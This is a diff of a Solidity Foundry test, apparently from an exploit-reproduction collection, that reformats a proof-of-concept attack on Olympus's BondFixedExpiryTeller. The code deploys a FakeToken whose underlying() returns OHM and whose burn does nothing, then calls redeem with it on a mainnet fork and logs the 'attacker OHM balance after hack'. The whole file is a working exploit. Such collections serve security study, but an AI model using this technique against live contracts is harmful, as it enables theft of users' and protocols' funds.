@@ -21,7 +21,7 @@ interface IBondFixedExpiryTeller {
 }
 
 contract FakeToken {
-    function underlying() external view returns(address) {
+    function underlying() external view returns (address) {
         return OHM;
     }
 
@@ -29,16 +29,14 @@ contract FakeToken {
         return 1;
     }
 
-    function burn(address,uint256) external {
+    function burn(address, uint256) external {
         // no thing
     }
 }
 
-
 contract AttackContract is Test {
-
     function setUp() public {
-        cheat.createSelectFork("mainnet", 15794363);
+        cheat.createSelectFork("mainnet", 15_794_363);
         cheat.label(OHM, "OHM");
         cheat.label(BondFixedExpiryTeller, "BondFixedExpiryTeller");
     }
@@ -50,10 +48,9 @@ contract AttackContract is Test {
         address fakeToken = address(new FakeToken());
         cheat.label(fakeToken, "FakeToken");
         // console.log("Deploy fake token on ", fakeToken);
-        
-        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, 30437077948152);
+
+        IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, 30_437_077_948_152);
         console.log("Redeeming");
         emit log_named_decimal_uint("Attacker OHM Balance after hack", IERC20(OHM).balanceOf(address(this)), 9);
-        
     }
 }
